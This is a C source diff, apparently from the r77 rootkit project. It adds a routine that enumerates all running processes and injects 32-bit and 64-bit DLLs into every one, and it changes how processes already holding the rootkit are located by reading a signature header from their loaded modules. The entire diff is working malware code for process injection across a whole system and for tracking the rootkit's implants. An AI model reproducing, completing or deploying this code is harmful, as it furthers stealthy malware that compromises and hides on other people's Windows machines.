@@ -85,6 +85,28 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize)
 
 	return result;
 }
+BOOL InjectAllProcesses(LPBYTE dll32, DWORD dll32Size, LPBYTE dll64, DWORD dll64Size)
+{
+	BOOL result = FALSE;
+
+	LPDWORD processes = NEW_ARRAY(DWORD, 10000);
+	DWORD processCount = 0;
+	if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
+	{
+		processCount /= sizeof(DWORD);
+
+		for (DWORD i = 0; i < processCount; i++)
+		{
+			InjectDll(processes[i], dll32, dll32Size);
+			InjectDll(processes[i], dll64, dll64Size);
+		}
+
+		result = TRUE;
+	}
+
+	FREE(processes);
+	return result;
+}
 
 BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
 {
@@ -95,7 +117,7 @@ BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
 	DWORD processCount = 0;
 	HMODULE *modules = NEW_ARRAY(HMODULE, 10000);
 	DWORD moduleCount = 0;
-	BYTE moduleBytes[512];
+	BYTE moduleBytes[10];
 
 	if (EnumProcesses(processes, 10000 * sizeof(DWORD), &processCount))
 	{
@@ -112,16 +134,16 @@ BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
 
 					for (DWORD j = 0; j < moduleCount; j++)
 					{
-						if (ReadProcessMemory(process, (LPBYTE)modules[j], moduleBytes, 512, NULL))
+						if (ReadProcessMemory(process, &((LPBYTE)modules[j])[R77_HEADER_OFFSET], moduleBytes, 10, NULL))
 						{
-							WORD signature = *(LPWORD)&moduleBytes[sizeof(IMAGE_DOS_HEADER)];
+							WORD signature = *(LPWORD)moduleBytes;
 							if (signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE || signature == R77_HELPER_SIGNATURE)
 							{
 								if (actualCount < *count)
 								{
 									r77Processes[actualCount].ProcessId = processes[i];
 									r77Processes[actualCount].Signature = signature;
-									r77Processes[actualCount++].DetachAddress = signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE ? *(DWORD64*)&moduleBytes[sizeof(IMAGE_DOS_HEADER) + 2] : 0;
+									r77Processes[actualCount++].DetachAddress = signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE ? *(DWORD64*)&moduleBytes[2] : 0;
 								}
 								else
 								{
